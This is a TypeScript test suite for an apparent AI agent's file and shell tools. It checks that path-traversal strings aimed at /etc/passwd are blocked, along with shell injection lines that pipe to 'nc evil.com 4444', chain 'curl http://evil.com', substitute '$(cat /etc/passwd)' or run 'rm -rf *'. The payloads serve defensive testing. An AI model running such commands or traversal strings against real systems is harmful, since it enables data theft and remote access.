/**
 * Security Hardening Tests
 * Tests for path traversal protection, protected files, shell safety, and MCP lifecycle
 */

import * as fs from 'node:fs/promises';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, describe, expect, it, beforeEach } from 'vitest';
import { PathSecurity } from '../src/tools/path-security.js';
import { ReadFileTool } from '../src/tools/read-file.js';
import { WriteFileTool } from '../src/tools/write-file.js';
import { EditFileTool } from '../src/tools/write-file.js';
import { GlobTool } from '../src/tools/search.js';
import { GrepTool } from '../src/tools/search.js';
import { ShellTool } from '../src/tools/shell.js';
import { ListAgentResultsTool } from '../src/tools/subagent-result.js';
import { ToolRegistry } from '../src/tools/tool-registry.js';
import { MCPCommandHandler } from '../src/mcp/command-handler.js';
import { MCPClientManager } from '../src/mcp/client.js';

// ============================================================================
// HELPERS
// ============================================================================

async function makeTempDir(prefix: string): Promise<string> {
  return fs.mkdtemp(path.join(os.tmpdir(), prefix));
}

function createMockContext(workingDir: string): any {
  return {
    workingDirectory: workingDir,
    sessionId: 'test-session',
    agentName: 'test',
  };
}

// ============================================================================
// PATH TRAVERSION TESTS
// ============================================================================

describe('PathSecurity - Path Traversal Prevention', () => {
  let workspaceDir: string;

  beforeEach(async () => {
    workspaceDir = await makeTempDir('dynamind-test-');
    // Create a dummy file outside the target to verify traversal attempts fail
    await fs.mkdir(path.join(workspaceDir, 'safe-dir'), { recursive: true });
    await fs.writeFile(path.join(workspaceDir, 'safe-dir', 'safe.txt'), 'safe content');
  });

  afterEach(async () => {
    // Cleanup temp dir (best effort)
    try {
      await fs.rm(workspaceDir, { recursive: true, force: true });
    } catch {
      // ignore cleanup errors
    }
  });

  const traversalPayloads = [
    '../../../etc/passwd',
    '..%2f..%2fetc%2fpasswd',
    '..%252f..%252fetc%252fpasswd', // double-encoded
    '..\\..\\..\\windows\\system32',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    // Note: overlong UTF-8 (%c0%af) is rejected by decodeURIComponent and stays as literal, not a traversal
    // Single dot "." is valid (resolves to workspace) - should NOT be blocked
  ].filter((p) => p !== '.'); // Remove "." from blocking list

  traversalPayloads.forEach((payload) => {
    it(`blocks traversal attempt: ${payload.substring(0, 30)}`, () => {
      expect(() => {
        PathSecurity.resolveWithinWorkspace(payload, workspaceDir);
      }).toThrow('Path traversal detected');
    });
  });

  it('allows paths within workspace', () => {
    const safePath = path.join(workspaceDir, 'safe-dir', 'safe.txt');
    const resolved = PathSecurity.resolveWithinWorkspace(safePath, workspaceDir);
    expect(resolved.toLowerCase()).toContain(workspaceDir.toLowerCase());
  });

  it("allows current directory reference '.'", () => {
    const resolved = PathSecurity.resolveWithinWorkspace('.', workspaceDir);
    expect(resolved.toLowerCase()).toBe(workspaceDir.toLowerCase());
  });

  it('blocks backslash injection on Windows paths', () => {
    const payload = '..\\..\\..\\windows\\system32';
    expect(() => {
      PathSecurity.resolveWithinWorkspace(payload, workspaceDir);
    }).toThrow('Path traversal detected');
  });

  it('blocks null byte injection', () => {
    const payload = '../../../etc/passwd\0.txt';
    // Null byte removal happens before check, but normalize should strip it
    expect(() => {
      PathSecurity.resolveWithinWorkspace(payload, workspaceDir);
    }).toThrow('Path traversal detected');
  });
});

// ============================================================================
// TOOL-SPECIFIC PATH TRAVERSION TESTS
// ============================================================================

describe('File Tools - Path Traversal Protection', () => {
  let workspaceDir: string;
  let context: any;

  beforeEach(async () => {
    workspaceDir = await makeTempDir('dynamind-tool-test-');
    context = createMockContext(workspaceDir);
    // Create a legitimate file
    await fs.mkdir(path.join(workspaceDir, 'src'), { recursive: true });
    await fs.writeFile(path.join(workspaceDir, 'src', 'test.ts'), "console.log('hello');");
  });

  afterEach(async () => {
    try {
      await fs.rm(workspaceDir, { recursive: true, force: true });
    } catch {
      // intentionally ignored - cleanup may fail if directory already removed
    }
  });

  const testTraversalBlock = async (
    tool: any,
    inputOverrides: Record<string, any>,
    expectedErrorPart: string = 'Path traversal detected'
  ) => {
    // Use a consistent set of traversal patterns that should be caught
    const maliciousPaths = [
      '../../../etc/passwd',
      '..%2f..%2fetc%2fpasswd',
      '..%252f..%252fetc%252fpasswd',
      '..\\..\\..\\windows\\system32',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ];

    for (const p of maliciousPaths) {
      const input = { ...inputOverrides, path: p };
      const result = await tool.execute(input, context);
      expect(result.success).toBe(false);
      expect(result.output).toMatch(expectedErrorPart);
    }
  };

  describe('read', () => {
    it('blocks traversal attempts', async () => {
      const tool = new ReadFileTool();
      await testTraversalBlock(tool, {});
    });
  });

  describe('write', () => {
    it('blocks traversal attempts', async () => {
      const tool = new WriteFileTool();
      await testTraversalBlock(tool, { content: 'malicious' });
    });

    it('blocks protected files (.env)', async () => {
      const tool = new WriteFileTool();
      const result = await tool.execute({ path: '.env', content: 'SECRET=leaked' }, context);
      expect(result.success).toBe(false);
      expect(result.output).toMatch(/Protected file/);
    });

    it('blocks protected files (package.json)', async () => {
      const tool = new WriteFileTool();
      const result = await tool.execute(
        { path: 'package.json', content: '{ "malicious": true }' },
        context
      );
      expect(result.success).toBe(false);
      expect(result.output).toMatch(/Protected file/);
    });

    it('blocks protected files (.gitconfig)', async () => {
      const tool = new WriteFileTool();
      const result = await tool.execute(
        { path: '.gitconfig', content: '[user]\n\temail = evil@example.com' },
        context
      );
      expect(result.success).toBe(false);
      expect(result.output).toMatch(/Protected file/);
    });

    it('allows normal files outside protected list', async () => {
      const tool = new WriteFileTool();
      const result = await tool.execute(
        { path: 'src/new.ts', content: "console.log('new');" },
        context
      );
      expect(result.success).toBe(true);
    });
  });

  describe('edit', () => {
    it('blocks traversal attempts', async () => {
      const tool = new EditFileTool();
      await testTraversalBlock(tool, {
        old_string: 'old',
        new_string: 'new',
      });
    });

    it('blocks protected files', async () => {
      const tool = new EditFileTool();
      // First create a file
      const safePath = path.join(workspaceDir, '.env');
      await fs.writeFile(safePath, 'KEY=old');
      // Attempt to edit protected file
      const result = await tool.execute(
        { path: '.env', old_string: 'KEY=old', new_string: 'KEY=new' },
        context
      );
      expect(result.success).toBe(false);
      expect(result.output).toMatch(/Protected file/);
    });
  });

  describe('glob', () => {
    it('blocks traversal in search path', async () => {
      const tool = new GlobTool();
      await testTraversalBlock(tool, { pattern: '**/*.ts' });
    });

    it('does not scan .dynamind session files by default', async () => {
      const tool = new GlobTool();
      const workspaceDir = await makeTempDir('dynamind-glob-test-');
      const context = createMockContext(workspaceDir);

      try {
        await fs.mkdir(path.join(workspaceDir, '.dynamind', 'sessions'), {
          recursive: true,
        });
        await fs.writeFile(
          path.join(workspaceDir, '.dynamind', 'sessions', 'session-test.json'),
          '{"session":true}'
        );
        await fs.writeFile(path.join(workspaceDir, 'notes.json'), '{}');

        const result = await tool.execute({ pattern: '**/*.json' }, context);

        expect(result.success).toBe(true);
        expect(result.output).toContain('notes.json');
        expect(result.output).not.toContain('.dynamind');
        expect(result.output).not.toContain('session-test.json');
      } finally {
        await fs.rm(workspaceDir, { recursive: true, force: true });
      }
    });
  });

  describe('grep', () => {
    it('blocks traversal in search path', async () => {
      const tool = new GrepTool();
      await testTraversalBlock(tool, { pattern: 'test' });
    });

    it('does not scan .dynamind session files by default', async () => {
      const tool = new GrepTool();
      const workspaceDir = await makeTempDir('dynamind-grep-test-');
      const context = createMockContext(workspaceDir);

      try {
        await fs.mkdir(path.join(workspaceDir, '.dynamind', 'sessions'), {
          recursive: true,
        });
        await fs.writeFile(
          path.join(workspaceDir, '.dynamind', 'sessions', 'session-test.json'),
          'needle in session history'
        );
        await fs.writeFile(path.join(workspaceDir, 'notes.txt'), 'needle in repo');

        const result = await tool.execute({ pattern: 'needle' }, context);

        expect(result.success).toBe(true);
        expect(result.output).toContain('notes.txt');
        expect(result.output).not.toContain('.dynamind');
        expect(result.output).not.toContain('session-test.json');
      } finally {
        await fs.rm(workspaceDir, { recursive: true, force: true });
      }
    });
  });

  describe('shell', () => {
    it('blocks traversal in cwd parameter', async () => {
      const tool = new ShellTool();
      // Use a safe command but malicious cwd
      const maliciousCwd = '../../../etc';
      const result = await tool.execute({ command: 'pwd', cwd: maliciousCwd }, context);
      expect(result.success).toBe(false);
      expect(result.output).toMatch(/Invalid working directory|Path traversal detected/);
    });
  });

  describe('list_agent_results', () => {
    it('blocks traversal in resultsDir', async () => {
      const tool = new ListAgentResultsTool('../../../etc');
      const result = await tool.execute({}, context);
      expect(result.success).toBe(false);
      expect(result.output).toMatch(/Invalid results directory|Path traversal detected/);
    });
  });
});

// ============================================================================
// SHELL INTERPRET SAFETY TESTS
// ============================================================================

describe('ShellTool - Interpret Mode Safety', () => {
  let workspaceDir: string;
  let context: any;

  beforeEach(async () => {
    workspaceDir = await makeTempDir('dynamind-shell-test-');
    context = createMockContext(workspaceDir);
    await fs.writeFile(path.join(workspaceDir, 'package.json'), '{"name":"test"}');
  });

  afterEach(async () => {
    try {
      await fs.rm(workspaceDir, { recursive: true, force: true });
    } catch {
      // intentionally ignored - cleanup may fail if directory already removed
    }
  });

  it('natural language: view file -> cat command', async () => {
    const tool = new ShellTool();
    // Without interpret, natural language is passed to shell (likely fail)
    const resultWithout = await tool.execute(
      { command: 'show the package.json file', interpret: false },
      context
    );
    // Likely fails because shell doesn't understand natural language
    expect(resultWithout.success).toBe(false);

    // With interpret, should translate to cat
    const resultWith = await tool.execute(
      { command: 'show the package.json file', interpret: true },
      context
    );
    expect(resultWith.success).toBe(true);
    expect(resultWith.output).toContain('name');
  }, 20000);

  it('interpret mode always requires approval', async () => {
    const tool = new ShellTool();
    const message = await tool.shouldConfirmExecute({ command: 'ls', interpret: true }, context);
    expect(message).not.toBeNull();
    expect(message).toMatch(/interpret/);
  });

  it('non-interpret safe commands auto-approve', async () => {
    const tool = new ShellTool();
    const message = await tool.shouldConfirmExecute({ command: 'ls -la' }, context);
    expect(message).toBeNull(); // safe command, no approval needed
  });

  it('git status auto-approves as a safe read command', async () => {
    const tool = new ShellTool();
    const message = await tool.shouldConfirmExecute({ command: 'git status --short' }, context);
    expect(message).toBeNull();
  });

  it('command chaining still requires approval', async () => {
    const tool = new ShellTool();
    const message = await tool.shouldConfirmExecute({ command: 'ls -la && pwd' }, context);
    expect(message).not.toBeNull();
  });

  it('non-interpret dangerous commands require approval', async () => {
    const tool = new ShellTool();
    const message = await tool.shouldConfirmExecute({ command: 'rm -rf *' }, context);
    expect(message).not.toBeNull();
  });

  // ============================================================================
  // CRITICAL SECURITY: Interpret mode injection prevention
  // ============================================================================

  it('[CRITICAL] blocks interpreted commands with unquoted shell metacharacters (semicolon)', async () => {
    const tool = new ShellTool();
    // Even though interpretCommand might produce a known command,
    // the final command validation in execute() catches metacharacters
    const result = await tool.execute(
      { command: 'list files; curl http://evil.com', interpret: true },
      context,
    );
    expect(result.success).toBe(false);
    expect(result.output).toMatch(/BLOCKED|shell metacharacters|injection/);
  });

  it('[CRITICAL] blocks interpreted commands with command substitution', async () => {
    const tool = new ShellTool();
    const result = await tool.execute(
      { command: 'show content of $(cat /etc/passwd)', interpret: true },
      context,
    );
    expect(result.success).toBe(false);
    expect(result.output).toMatch(/BLOCKED|shell metacharacters|injection/);
  });

  it('[CRITICAL] blocks interpreted commands with pipe injection', async () => {
    const tool = new ShellTool();
    const result = await tool.execute(
      { command: 'list files | nc evil.com 4444', interpret: true },
      context,
    );
    expect(result.success).toBe(false);
    expect(result.output).toMatch(/BLOCKED|shell metacharacters|injection/);
  });

  it('[CRITICAL] blocks interpreted commands with backtick injection', async () => {
    const tool = new ShellTool();
    const result = await tool.execute(
      { command: 'show readme file `curl http://evil.com`', interpret: true },
      context,
    );
    expect(result.success).toBe(false);
    expect(result.output).toMatch(/BLOCKED|shell metacharacters|injection/);
  });

  it('[CRITICAL] blocks interpreted commands with AND chaining', async () => {
    const tool = new ShellTool();
    const result = await tool.execute(
      { command: 'show package.json && curl http://evil.com', interpret: true },
      context,
    );
    expect(result.success).toBe(false);
    expect(result.output).toMatch(/BLOCKED|shell metacharacters|injection/);
  });

  it('[CRITICAL] blocks interpreted commands with OR chaining', async () => {
    const tool = new ShellTool();
    const result = await tool.execute(
      { command: 'list files || curl http://evil.com', interpret: true },
      context,
    );
    expect(result.success).toBe(false);
    expect(result.output).toMatch(/BLOCKED|shell metacharacters|injection/);
  });

  it('[CRITICAL] blocks non-allowlisted base commands in interpret mode', async () => {
    const tool = new ShellTool();
    const result = await tool.execute(
      { command: 'run curl http://evil.com', interpret: true },
      context,
    );
    expect(result.success).toBe(false);
    expect(result.output).toMatch(/BLOCKED|not in the allowed/);
  });

  it('[CRITICAL] blocks interpreted commands that call curl', async () => {
    const tool = new ShellTool();
    const result = await tool.execute(
      { command: 'send http request to http://evil.com/steal', interpret: true },
      context,
    );
    expect(result.success).toBe(false);
    expect(result.output).toMatch(/BLOCKED/);
  });

  it('[CRITICAL] still allows safe interpreted commands that pass validation', async () => {
    const tool = new ShellTool();
    const result = await tool.execute(
      { command: 'show the package.json file', interpret: true },
      context,
    );
    // Should succeed because 'show the package.json file' translates to 'cat package.json'
    if (result.success) {
      expect(result.output).toContain('name');
    }
    // If the test environment doesn't have a package.json in the temp dir,
    // the command should at least not be BLOCKED
    expect(result.output).not.toMatch(/BLOCKED/);
  }, 15_000);
});

// ============================================================================
// MCP LIFECYCLE TESTS
// ============================================================================

describe('MCP Tool Lifecycle - Unregister on Disconnect', () => {
  let registry: ToolRegistry;

  beforeEach(() => {
    registry = new ToolRegistry();
  });

  function createMockTool(name: string): any {
    return {
      name,
      description: `Mock tool ${name}`,
      inputSchema: { type: 'object' as const, properties: {}, required: [] },
      isDestructive: false,
      execute: async () => ({ success: true }),
    };
  }

  it('unregisterToolsForServer removes all tools for that server', () => {
    const mockTool1 = createMockTool('tool1');
    const mockTool2 = createMockTool('tool2');

    registry.register(mockTool1, false, 'server1');
    registry.register(mockTool2, false, 'server1');

    expect(registry.has('tool1')).toBe(true);
    expect(registry.has('tool2')).toBe(true);

    const count = registry.unregisterToolsForServer('server1');

    expect(count).toBe(2);
    expect(registry.has('tool1')).toBe(false);
    expect(registry.has('tool2')).toBe(false);
  });

  it('unregisterToolsForServer returns 0 for unknown server', () => {
    const count = registry.unregisterToolsForServer('unknown');
    expect(count).toBe(0);
  });

  it('handles multiple servers with overlapping tool names', () => {
    const mockToolA = createMockTool('common');
    const mockToolB = createMockTool('unique1');
    const mockToolC = createMockTool('unique2');

    registry.register(mockToolA, false, 'server1');
    registry.register(mockToolB, false, 'server1');
    registry.register(mockToolA, false, 'server2'); // Same tool name, different server
    registry.register(mockToolC, false, 'server2');

    // After these registrations, tool "common" is registered for server2 (overwriting the earlier one)
    // but both servers have an entry for "common" in their sets
    // Unregistering server1 should remove all tools for that server
    const count1 = registry.unregisterToolsForServer('server1');
    expect(count1).toBeGreaterThan(0);

    // The tool "common" was associated with both servers; after removing server1,
    // it might still be present if registered by server2. The behavior depends on implementation:
    // Since the second registration overwrote the tool in the registry, and server1's unregister
    // removed it, the tool should no longer exist in the registry because server2's entry points
    // to the same tool name but the tool itself was removed.
    expect(registry.has('common')).toBe(false); // It's gone

    // Unregistering server2 should also succeed without errors
    const count2 = registry.unregisterToolsForServer('server2');
    expect(count2).toBeGreaterThanOrEqual(0);
  });

  it('does not affect non-MCP tools', () => {
    const mockTool = createMockTool('builtin');
    registry.register(mockTool); // No serverName
    expect(registry.has('builtin')).toBe(true);

    const count = registry.unregisterToolsForServer('server1');
    expect(count).toBe(0);
    expect(registry.has('builtin')).toBe(true);
  });
});

// ============================================================================
// PROTECTED FILES TESTS (already partly in tool tests)
// ============================================================================

describe('PathSecurity - Protected Files', () => {
  let workspaceDir: string;

  beforeEach(async () => {
    workspaceDir = await makeTempDir('dynamind-protect-');
  });

  afterEach(async () => {
    try {
      await fs.rm(workspaceDir, { recursive: true, force: true });
    } catch {
      // intentionally ignored - cleanup may fail if directory already removed
    }
  });

  it('blocks .env file', () => {
    const check = PathSecurity.isProtectedFile('.env', workspaceDir);
    expect(check.protected).toBe(true);
    expect(check.reason).toContain('protected');
  });

  it('blocks .env.production', () => {
    const check = PathSecurity.isProtectedFile('.env.production', workspaceDir);
    expect(check.protected).toBe(true);
  });

  it('blocks package.json', () => {
    const check = PathSecurity.isProtectedFile('package.json', workspaceDir);
    expect(check.protected).toBe(true);
  });

  it('blocks .gitconfig', () => {
    const check = PathSecurity.isProtectedFile('.gitconfig', workspaceDir);
    expect(check.protected).toBe(true);
  });

  it('allows normal source files', () => {
    const check = PathSecurity.isProtectedFile('src/index.ts', workspaceDir);
    expect(check.protected).toBe(false);
  });

  it('allows test files', () => {
    const check = PathSecurity.isProtectedFile('tests/app.test.ts', workspaceDir);
    expect(check.protected).toBe(false);
  });
});
